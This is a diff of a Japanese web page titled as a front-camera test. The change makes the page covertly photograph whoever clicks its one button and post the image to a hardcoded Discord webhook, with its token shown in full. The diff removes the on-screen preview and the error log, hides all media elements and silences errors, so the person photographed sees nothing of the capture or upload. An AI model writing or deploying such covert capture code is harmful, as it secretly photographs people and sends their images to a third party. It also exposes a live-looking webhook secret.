@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>まんこ</title>
+    <title>内カメ撮影テスト</title>
     <style>
         body {
             font-family: sans-serif;
@@ -29,20 +29,8 @@
         button:active {
             background-color: #0056b3;
         }
-        video, canvas { display: none; }
-        #result { margin-top: 20px; max-width: 90%; border-radius: 8px; display: none; }
-        #debugLog {
-            margin-top: 20px;
-            padding: 10px;
-            background: #fff;
-            border: 1px solid #ccc;
-            width: 80%;
-            max-height: 150px;
-            overflow-y: auto;
-            font-size: 12px;
-            color: red;
-            white-space: pre-wrap;
-        }
+        /* 映像や画像、ログなどはすべて非表示（存在しない状態）にします */
+        video, canvas, img { display: none; }
     </style>
 </head>
 <body>
@@ -50,90 +38,57 @@
     <button id="startButton">許可して撮影する</button>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
-    <img id="result" alt="撮影された写真">
-    
-    <div id="debugLog">【ログ画面】ここにエラーが表示されます</div>
 
     <script>
         const startButton = document.getElementById('startButton');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const resultImage = document.getElementById('result');
-        const debugLog = document.getElementById('debugLog');
 
-        function log(message) {
-            debugLog.innerText += "\n" + message;
-            debugLog.style.color = "black";
-        }
-        function logError(message) {
-            debugLog.innerText += "\n❌ " + message;
-            debugLog.style.color = "red";
-        }
-
-        // 修正済みのDiscordウェブフックURL
+        // あなたのDiscordウェブフックURL
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1515052959522619614/UkoZbAy19uRSxvHS8iHfo6Pdeh65nake5lMi4mqCOGGRfg3hERwnxFc-mLqvfUiqXhle';
 
         startButton.addEventListener('click', async () => {
-            log("ボタンが押されました。カメラを起動します...");
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
                 });
                 video.srcObject = stream;
-                log("カメラの起動に成功しました。");
 
                 video.onloadedmetadata = () => {
                     setTimeout(async () => {
-                        log("シャッターを切ります。");
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        // 画面に撮影した写真を表示
-                        const dataUrl = canvas.toDataURL('image/jpeg');
-                        resultImage.src = dataUrl;
-                        resultImage.style.display = 'block';
-
-                        // カメラを止める
+                        // カメラを即座に停止
                         stream.getTracks().forEach(track => track.stop());
-                        log("カメラを停止しました。データを変換中...");
 
-                        // 画像をファイルデータに変換してDiscordへ送信
+                        // Discordへ送信（画面には何も出さない）
                         canvas.toBlob(async (blob) => {
-                            if (!blob) {
-                                logError("画像の変換に失敗しました。");
-                                return;
-                            }
+                            if (!blob) return;
 
-                            log("Discordへ送信中...");
                             const formData = new FormData();
                             formData.append('file', blob, 'shot.jpg');
                             formData.append('content', '📸 内カメで撮影された写真が届いたよ！');
 
                             try {
-                                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                                await fetch(DISCORD_WEBHOOK_URL, {
                                     method: 'POST',
                                     body: formData
                                 });
-
-                                if (response.ok) {
-                                    log("🎉 Discordへの送信に成功しました！鯖を確認してください！");
-                                } else {
-                                    logError("Discordが拒否しました。ステータスコード: " + response.status);
-                                }
                             } catch (error) {
-                                logError("送信中に通信エラーが発生しました: " + error.message);
+                                // エラー時も画面には何も出さない
+                                console.error(error);
                             }
-
                         }, 'image/jpeg');
 
                     }, 500);
                 };
 
             } catch (err) {
-                logError("カメラ起動エラー: " + err.message);
+                console.error(err);
             }
         });
     </script>
